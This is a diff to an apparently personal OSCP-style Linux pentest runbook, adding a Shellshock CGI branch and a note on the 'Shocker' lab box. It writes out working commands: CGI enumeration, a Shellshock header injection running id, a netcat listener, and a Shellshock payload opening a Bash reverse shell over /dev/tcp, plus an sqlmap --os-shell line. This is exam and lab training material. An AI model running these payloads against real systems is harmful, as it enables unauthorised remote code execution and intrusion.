@@ -341,6 +341,40 @@ sqlmap -r post.txt -p <param> --os-shell --web-root "/var/www/html/tmp"   # full
 #### Step 1d: Phishing (Credential Capture)
 > The technique (clone a login page, patch it, capture credentials) is genuinely OS-agnostic, it targets the person, not the target machine's OS, so the full writeup lives once in [[Windows Methodology#Step 1c: Phishing (Credential Capture)|Windows Methodology's Step 1c]] rather than being duplicated here. Full walkthrough: [[11. Phishing Basics|Phishing Basics]].
 
+#### Apache CGI Shellshock branch
+
+When Apache exposes CGI, request the directory and enumerate direct script names even if listing is forbidden. Prove the header injection with id before asking for a callback.
+
+~~~bash
+# Preserve the direct CGI response and the directory status.
+curl -si "http://$BoxIP:$WebPort/cgi-bin/$Script" | tee "$BoxDir/loot/cgi-baseline.txt"
+
+curl -si "http://$BoxIP:$WebPort/cgi-bin/"
+
+# Enumerate likely CGI script extensions below the directory.
+gobuster dir -u "http://$BoxIP:$WebPort/cgi-bin/" \
+  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
+  -x sh,cgi,pl,py \
+  -o "$BoxDir/loot/gobuster-cgi.txt"
+
+# Harmless Shellshock proof through the User-Agent environment value.
+curl -si "http://$BoxIP:$WebPort/cgi-bin/$Script" \
+  -H 'User-Agent: () { :; }; echo; echo; /usr/bin/id' \
+  | tee "$BoxDir/loot/shellshock-id.txt"
+
+# Start the callback listener before the Bash request.
+nc -lvnp "$Lport"
+
+# Send the callback through the already-proven CGI script.
+curl --max-time 10 -si "http://$BoxIP:$WebPort/cgi-bin/$Script" \
+  -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/$LocalIP/$Lport 0>&1"
+~~~
+
+The uid line is the proof. A request timeout after the callback starts can be normal because the CGI process remains attached to the shell. Continue to [[OSCP/RUNBOOK V2/Linux - Shell Stabilise|Linux - Shell Stabilise]], then run [[OSCP/RUNBOOK V2/Linux - Sudo Check|Linux - Sudo Check]] early.
+
+> [!warning] 💡
+> Keep the web port and callback port separate. If the proof works but the callback fails, check LocalIP, listener state, egress, Bash availability, and header quoting in that order.
+
 #### Step 2: Shells & Payloads
 
 **Netcat**:
@@ -702,6 +736,12 @@ sudo -l -> systemctl list-timers --all -> inspect script ownership/data flow
 ```
 
 The repeatable lesson is to follow the data and ownership transition, not just the process name. A backup job can be safe or exploitable depending on who creates its archive, where it is stored, whether it is validated, and which identity extracts it.
+## Shocker methodology note
+
+Shocker demonstrates the full Linux fast path: validate the active target after a stale-address failure, save a complete port scan, route HTTP into CGI enumeration, prove Shellshock with id, catch and stabilise a Bash callback, then inspect sudo before considering slower privilege-escalation branches. The final boundary was an exact passwordless Perl rule, so the approved interpreter path and its arguments were preserved as evidence.
+
+See [[OSCP/BOXES/WRITE UPS/Linux/Shocker|Shocker]], [[OSCP/RUNBOOK V2/Linux - Shellshock CGI|Linux - Shellshock CGI]], and [[OSCP/DECISION TREE/Web Applications (Decision Tree)|Web Applications decision tree]].
+
 ## External Resources
 
 - https://book.hacktricks.wiki/en/generic-methodologies-and-resources/index.html
